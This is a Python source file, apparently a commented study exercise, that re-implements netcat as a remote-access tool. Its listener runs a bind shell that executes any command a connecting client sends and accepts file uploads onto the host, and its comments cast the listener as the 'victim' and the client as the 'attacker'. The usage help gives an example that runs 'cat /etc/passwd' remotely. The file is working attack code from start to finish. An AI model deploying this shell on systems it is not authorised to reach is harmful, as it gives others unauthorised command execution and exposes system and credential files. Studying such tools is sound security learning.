import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


# function for executing a command that is given by the user in the terminal
def execute(cmd):
    cmd = (
        cmd.strip()
    )  # remove leading and trailing whitespaces from the terminal command

    if not cmd:
        return  # if nothing in command return immediately

    # subprocess.check_output() executes a command and returns the output
    output = subprocess.check_output(
        shlex.split(cmd),  # splits the command into relevant keywords in a list
        stderr=subprocess.STDOUT,
    )  # combines stderr into stdout so that nothing is lost

    return output.decode()  # returns decoded output


class NetCat:

    def __init__(self, args, buffer=None):
        # initializing the NetCat object
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # sets REUSEADDR to 1 (true)
        # allows the socket to reuse the port immediately after closing
        # prevents "Address already in use" error when restarting the server

    # defines what the NetCat class do depending on whether the user sets the listen flag to true or false
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    # if -l not set, then sends data
    def send(self):
        self.socket.connect(
            (self.args.target, self.args.port)
        )  # sestabilishes a connection to server
        print(f"[*] Connected successfully to {self.args.target}:{self.args.port}")

        if self.buffer:
            self.socket.send(
                self.buffer
            )  # if user typed in something in the buffer or piped something

        try:
            while True:
                recv_len = 1
                response = ""
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                # keeps receiving 4096 byte chunks until a partial chunk is received
                # this signals that no more data is coming, so breaks

                # if there is response from the server, do this
                if response:
                    print(response)  # prints response from server to user screen
                    buffer = input(
                        "> "
                    )  # takes further input command from the user to send to user
                    buffer += "\n"  # adds a newline at end of buffer (to signify to server that it has reached end of the request)
                    self.socket.send(buffer.encode())  # sends request to server

        except KeyboardInterrupt:  # loops until user enters Ctrl+C
            print("User terminated")
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        try:

            # accepts a connection, starts a handle() thread for it immediately loops back and waits for a new conneciton
            while True:
                client_socket, _ = self.socket.accept()
                client_thread = threading.Thread(
                    target=self.handle, args=(client_socket,)
                )  # (client_socket, ) makes it into a tuple and args expects a tuple
                client_thread.start()

        except KeyboardInterrupt:
            print("[*] Session terminated")
            self.socket.close()
            sys.exit()

    def handle(self, client_socket):

        # in this use case, the server is the victim and the client is the attacker

        # mode 1: run a single command on server's computer (the command that -e takes as an arg)
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # mode 2: receive a file from client (attacker) and 
        # save it as file with filename arg on the server's computer (victim's computer) 
        elif self.args.upload:
            file_buffer = b""   # empty bytes to store incoming traffic
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data     # keep adding data chunks to the file buffer
                else:
                    break  # there is no more data so break

            with open(self.args.upload, "wb") as f:    # opens the filename from the -u flag in write binary mode
                f.write(file_buffer)    # writes to the file opened
            message = f"Saved to file {self.args.upload}"
            client_socket.send(message.encode())  # sends confirmation message back to client to tell that it worked



        # mode 3: spawns an interactive bind shell on victim/listener's computer,
        # attacker can type commands and receive input in real time
        elif self.args.command:   # if command flag is set
            cmd_buffer = b""  # set command buffer to empty bytes to store incoming command bytes
            while True:
                try:
                    client_socket.send(b"<BHP: #> ")    # send a prompt to client to signify that ready for next commands
                    while "\n" not in cmd_buffer.decode():   # while command is not finished being entered, take command
                        cmd_buffer += client_socket.recv(64)  # receive command from client and save in buffer
                    response = execute(cmd_buffer.decode())   # execute the command that was entered locally on server's computer 
                                                              # and store the response
                    if response:
                        client_socket.send(response.encode())  # if there is a response, send it back to the client
                    cmd_buffer = b""  # sets the buffer empty again

                except Exception as e:
                    # catches any exception (client disconnect, bad command, etc.)
                    # closes socket cleanly and exits the server
                    print(f"Server killed {e}")
                    self.socket.close()
                    sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Netcat Tool",  # short description for this program
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""Example: 
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u = mytest.txt # upload to a file
        netcat.py -t 192.168.1.108 -p 5555 -l -e = \"cat /etc/passwd\" # execute command
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 143 # echo text to server port 143
        netcat.py -t 192.168.1.108 -p 5555 # connect to a server
        """),
    )

    # epilog is the help page for the parser

    parser.add_argument("-c", "--command", action="store_true", help="command shell")
    parser.add_argument("-e", "--execute", help="execute specified command")
    parser.add_argument("-l", "--listen", action="store_true", help="listen")
    parser.add_argument("-p", "--port", type=int, default=5555, help="specified port")
    parser.add_argument("-t", "--target", default="192.168.1.203", help="specified IP")
    parser.add_argument("-u", "--upload", help="upload file")

    # add_argument defines a flag — short form, long form, and optional parameters like type, default, action, and help text

    args = parser.parse_args()  # parses the args into a namespace type called args

    if args.listen:
        buffer = ""  # if listen argument is set to true, buffer will start as empty
    else:
        print(
            "[*] Press Ctrl+D to begin program execution or pipe data into this program"
        )
        buffer = (
            sys.stdin.read()
        )  # otherwise buffer will read in starting bytes from user input or from a piped in command (echo "hello" | python netcat.py)

    nc = NetCat(args, buffer.encode())  # encode() covnerts string to bytes

    nc.run()
